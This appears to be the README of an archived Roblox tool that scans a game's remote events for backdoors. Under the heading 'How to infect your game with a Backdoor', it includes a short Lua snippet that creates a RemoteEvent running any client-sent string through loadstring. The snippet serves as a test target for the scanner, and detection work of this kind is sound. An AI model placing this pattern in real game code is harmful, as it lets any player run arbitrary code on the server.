<h2 align="center"> 
  <a href="https://github.com/iK4oS/backdoor.exe">
    <img src="logo_outlined.png" width="700" alt="logo">
  </a>
</h2>

<p align="center"> 
  <img alt="Version" src="https://img.shields.io/badge/version-8.0.0-blue.svg?cacheSeconds=2592000" />
  <a href="https://github.com/iK4oS/backdoor.exe/graphs/commit-activity" target="_blank">
    <img alt="Maintenance" src="https://img.shields.io/badge/Maintained-yes-green.svg" />
  </a>
  <a href="https://github.com/iK4oS/backdoor.exe/blob/master/LICENSE" target="_blank">
    <img alt="License: GPL--3.0" src="https://img.shields.io/github/license/iK4oS/backdoor.exe" />
  </a>
  <div align="center">
  <h1>🚨 THIS HAS BEEN ARCHIVED/DISCONTINUED UNTIL FUTHER NOTICE 🚨</h1>
</div>
</p>

An in-game interface/tool to scan every remote for backdoors. </br>
**Tool was made to find backdoors in your game.** This is NOT a backdoor itself.




<!--- ### ✨ [Demo](https://demo.url/) Comming soon 😉 --->

# How to infect your game with a Backdoor
```lua
local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = "Backdoor"
backdoor.OnServerEvent:connect(function(player, SS)
    loadstring(SS)()
end)
```
Do not forget to **Enable Loadstrings in ServerScriptServices** <br>
![image](https://user-images.githubusercontent.com/47014074/233855562-e9afa553-4279-4501-a26d-43623852d3dc.png)


# Macros
Macros are string that get replaced so you don't have to type out your information each time.
| MACRO | INFO |
| :---: | :--- |
| %username% | Your username |
| %userid% | Your User ID |
| %userping% | Your ping |
| %debug% | Your debug setting |


# Contributing
Contributions, issues, and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/iK4oS/backdoor.exe/issues).
* Undetected backdoors reports are appreciated as contribute to providing the best-updated backdoor scanner out there.

# Show your support
Give a ⭐️ if this project helped you or join our [Discord](https://discord.gg/k4scripts-731881028573986874) !

# 📝 License

Copyright © 2021 [iK4oS](https://github.com/iK4oS).<br />
This project is [GPL-3.0](https://github.com/iK4oS/backdoor.exe/blob/master/LICENSE) licensed.
